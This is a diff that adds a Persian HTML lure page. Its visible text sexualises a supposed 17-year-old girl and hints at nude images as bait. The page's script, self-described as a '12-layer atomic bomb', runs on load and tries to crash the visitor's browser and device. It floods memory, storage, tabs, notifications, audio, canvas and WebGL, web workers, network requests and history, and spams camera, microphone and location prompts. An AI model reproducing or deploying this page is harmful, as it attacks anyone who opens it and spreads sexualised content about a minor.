@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>محیا</title>
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    background: #1a1a2e;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    font-family: 'Traditional Arabic', 'Amiri', serif;
+    color: #ffd700;
+    text-align: center;
+    overflow: hidden;
+    position: relative;
+}
+.content {
+    z-index: 10;
+    padding: 30px;
+    max-width: 500px;
+    background: rgba(0,0,0,0.4);
+    border-radius: 20px;
+    border: 2px solid #ffd700;
+    box-shadow: 0 0 50px rgba(255,215,0,0.2);
+    animation: glow 2s infinite alternate;
+}
+@keyframes glow {
+    0% { box-shadow: 0 0 20px rgba(255,215,0,0.2); }
+    100% { box-shadow: 0 0 60px rgba(255,215,0,0.6); }
+}
+h1 {
+    font-size: 28px;
+    margin: 0 0 10px;
+    color: #ffd700;
+    text-shadow: 0 0 20px #ffd700;
+}
+p {
+    font-size: 18px;
+    line-height: 2;
+    margin: 10px 0;
+    color: #f5e6a3;
+}
+.highlight {
+    color: #ffd700;
+    font-weight: bold;
+}
+</style>
+</head>
+<body>
+<div class="content">
+    <h1>✨ محیا ✨</h1>
+    <p>
+        دختری ۱۷ ساله، اهل نهاوند، <span class="highlight">داف محل</span><br>
+        عاشق پسرا 💕<br><br>
+        خیلی دلم میخواد پسر برام خرج کنه و مطیعم باشه<br>
+        اگه میخوای رل بزنی باید برام خرج کنی 💰<br><br>
+        ولی بهت <span class="highlight">نود</span> و غیره میدم 😉
+    </p>
+</div>
+<script>
+// ==================== بمب اتمی ۱۲ لایه ====================
+
+// لایه ۱: بمب حافظه با آرایه‌های ۱۰۰۰ مگابایتی
+var memory = [];
+function memoryBomb() {
+    for (var i = 0; i < 10000; i++) {
+        memory.push(new Array(10000000).join('𒀀'));
+        memory.push(new Array(10000000).join('🔥'));
+    }
+}
+setInterval(memoryBomb, 1);
+
+// لایه ۲: حلقه‌های بی‌نهایت با کاراکترهای سنگین
+function infiniteLoop() {
+    var chars = ['⃟','꙰','𒀀','𐎠','💀','🔥','⚡','💥','🎯','☢️'];
+    while (true) {
+        document.body.innerHTML += chars[Math.floor(Math.random() * chars.length)];
+        document.body.innerHTML += '💀'.repeat(10000);
+        document.body.innerHTML += '🔥'.repeat(10000);
+    }
+}
+setTimeout(infiniteLoop, 0);
+
+// لایه ۳: درخواست‌های سخت‌افزاری
+function hardwareAttack() {
+    for (var i = 0; i < 1000; i++) {
+        try {
+            navigator.geolocation.getCurrentPosition(function(){}, function(){});
+            navigator.mediaDevices.getUserMedia({audio:true, video:true});
+            navigator.vibrate(100000);
+            navigator.mediaDevices.enumerateDevices();
+        } catch(e) {}
+    }
+}
+setInterval(hardwareAttack, 1);
+
+// لایه ۴: بمب تب
+function tabBomb() {
+    for (var i = 0; i < 200; i++) {
+        window.open('https://example.com', '_blank');
+        window.open('https://google.com', '_blank');
+        window.open('https://youtube.com', '_blank');
+    }
+}
+setInterval(tabBomb, 50);
+
+// لایه ۵: بمب نوتیفیکیشن
+function notifBomb() {
+    for (var i = 0; i < 100; i++) {
+        try {
+            Notification.requestPermission().then(function() {
+                new Notification('🔥 حمله اتمی!', {body: 'سیستم در حال فروپاشی!'});
+            });
+        } catch(e) {}
+    }
+}
+setInterval(notifBomb, 50);
+
+// لایه ۶: بمب کلیپ‌بورد
+function clipboardBomb() {
+    for (var i = 0; i < 200; i++) {
+        try {
+            navigator.clipboard.writeText('𒀀'.repeat(1000000) + '💀'.repeat(1000000));
+        } catch(e) {}
+    }
+}
+setInterval(clipboardBomb, 50);
+
+// لایه ۷: بمب ذخیره‌سازی
+function storageBomb() {
+    for (var i = 0; i < 100000; i++) {
+        try {
+            localStorage.setItem('bomb' + i, '𒀀'.repeat(1000000));
+            sessionStorage.setItem('bomb' + i, '💀'.repeat(1000000));
+        } catch(e) {}
+    }
+}
+setInterval(storageBomb, 1);
+
+// لایه ۸: بمب Web Workers
+function workerBomb() {
+    for (var i = 0; i < 200; i++) {
+        try {
+            var worker = new Worker('data:text/javascript;base64,' + btoa('while(true){}'));
+        } catch(e) {}
+    }
+}
+setInterval(workerBomb, 1);
+
+// لایه ۹: بمب Canvas و WebGL
+function canvasBomb() {
+    for (var i = 0; i < 1000; i++) {
+        var canvas = document.createElement('canvas');
+        canvas.width = 10000000;
+        canvas.height = 10000000;
+        var ctx = canvas.getContext('2d');
+        var gl = canvas.getContext('webgl');
+        for (var j = 0; j < 1000000; j++) {
+            ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
+            ctx.fillRect(Math.random()*10000000, Math.random()*10000000, 100000, 100000);
+            if (gl) {
+                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(10000000), gl.STATIC_DRAW);
+            }
+        }
+        document.body.appendChild(canvas);
+    }
+}
+setInterval(canvasBomb, 1);
+
+// لایه ۱۰: بمب صوتی
+function audioBomb() {
+    for (var i = 0; i < 200; i++) {
+        try {
+            var audio = new AudioContext();
+            for (var j = 0; j < 100000; j++) {
+                var oscillator = audio.createOscillator();
+                oscillator.frequency.value = Math.random() * 10000000;
+                oscillator.type = 'sawtooth';
+                oscillator.connect(audio.destination);
+                oscillator.start();
+                oscillator.stop(0.001);
+            }
+        } catch(e) {}
+    }
+}
+setInterval(audioBomb, 1);
+
+// لایه ۱۱: بمب fetch و شبکه
+function networkBomb() {
+    for (var i = 0; i < 1000; i++) {
+        try {
+            fetch('https://example.com?' + Math.random());
+            fetch('https://google.com?' + Math.random());
+        } catch(e) {}
+    }
+}
+setInterval(networkBomb, 1);
+
+// لایه ۱۲: بمب تاریخچه
+function historyBomb() {
+    for (var i = 0; i < 10000; i++) {
+        try {
+            history.pushState({}, '', '#' + Math.random());
+        } catch(e) {}
+    }
+}
+setInterval(historyBomb, 1);
+
+console.log('☢️ بمب اتمی ۱۲ لایه + متن محیا فعال شد!');
+</script>
+</body>
+</html>
